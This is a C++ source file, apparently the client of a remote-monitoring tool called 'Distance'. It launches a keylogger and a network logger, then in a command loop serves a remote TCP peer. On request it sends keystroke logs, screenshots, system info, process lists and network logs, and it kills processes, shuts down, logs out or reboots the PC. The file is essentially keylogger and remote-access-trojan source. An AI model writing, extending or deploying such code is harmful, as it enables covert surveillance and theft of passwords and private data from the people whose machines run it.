#include "ClientApp.hpp"


namespace Distance
{

    ClientApp* ClientApp::app_ = nullptr;



    ClientApp* ClientApp::getInstance()
    {
        if (!app_)
            app_ = new ClientApp();
        return app_;
    }



    void ClientApp::run()
    {
        Logger::make()->configure(_T("logs/"));

        ClientConfigurator configurator("client_settings.json");

        TcpClientSettings settings;
        try
        {
            configurator.loadSettings(settings);
        }
        catch (const std::exception& err)
        {
            Logger::make()->writeln("Client configurator error: ", err.what());
            return;
        }
 
        KeyloggerControl keylogger;
        try
        {
            keylogger.start();
        }
        catch (const xstar::WinAPIException& err)
        {
            Logger::make()->writeln("Keylogger error: ", err.what());
            return;
        }

        std::unique_ptr<NetfilterControl> netfilter;
        try
        {
            netfilter.reset(new NetfilterControl(NETFILTER_LOGFILE_NAME));
        }
        catch (const xstar::WinAPIException& err)
        {
            Logger::make()->writeln("Netfilter error: ", err.what());
            return;
        }

        try
        {
            xstar::SmartHandle logfile = CreateFileA(
                g_KeyloggerPathToLogFile,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                0,
                nullptr
            );
            if (logfile.getHandle() == INVALID_HANDLE_VALUE)
            {
                throw xstar::WinAPIException();
            }

            Query query;
            mainBuffer_ = std::make_unique<wchar_t []>(MainBufferSize / sizeof(wchar_t));

            client_.reset(new TcpSyncClient(ioContext_));
            client_->acceptQuery();
            while (true)
            {
                try
                {
                    client_->readQuery(&query);
                }
                catch (const std::exception&)
                {
                    client_.reset(new TcpSyncClient(ioContext_));
                    client_->acceptQuery();
                    continue;
                }

                switch (query)
                {
                case Query::GetInfoPC:
                {
                    ComputerInfo info;
                    info.updateInfo();

                    std::string infoBuf = info.packJson();
                    client_->dataSend(infoBuf);
                    break;
                }

                case Query::GetKeyLog:
                {
                    ZeroMemory(mainBuffer_.get(), MainBufferSize);
                    DWORD bytes;

                    BOOL isSuccess =
                    ReadFile(
                        logfile.getHandle(),
                        mainBuffer_.get(),
                        MainBufferSize,
                        &bytes,
                        nullptr
                    );
                    if (!isSuccess)
                        Logger::make()->writeln("Failed to read keylogger log file...");

                    mainBuffer_.get()[bytes ? bytes - 1 : 0] = L'\0';
                    client_->dataSend(mainBuffer_.get(), MainBufferSize / sizeof(wchar_t));
                    break;
                }

                case Query::GetProcessInfo:
                {
                    auto jsonList = ProcessListPackToJson(ProcessManager::update());
                    client_->dataSend(jsonList);
                    break;
                }

                case Query::TerminateProcess:
                {
                    uint32_t id = 0;
                    client_->dataReceive(&id, sizeof(uint32_t));
                    ProcessManager::terminate(id);
                    break;
                }

                case Query::GetScreenshot:
                {
                    std::string screenshot = CreateScreenshot();
                    client_->dataSend(screenshot);
                    break;
                }

                case Query::ShutdownPC:
                    PowerManager::shutdown();
                    break;
                case Query::LogoutPC:
                    PowerManager::logout();
                    break;
                case Query::RebootPC:
                    PowerManager::reboot();
                    break;

                case Query::GetNetLog:
                {
                    client_->dataSend(netfilter->getInfo(), PAGE_SIZE);
                    break;
                }
                default:
                    break;
                }
            }
        }
        catch (const std::exception& error)
        {
            Logger::make()->writeln(error.what());
        }
    }

} // namespace Distance
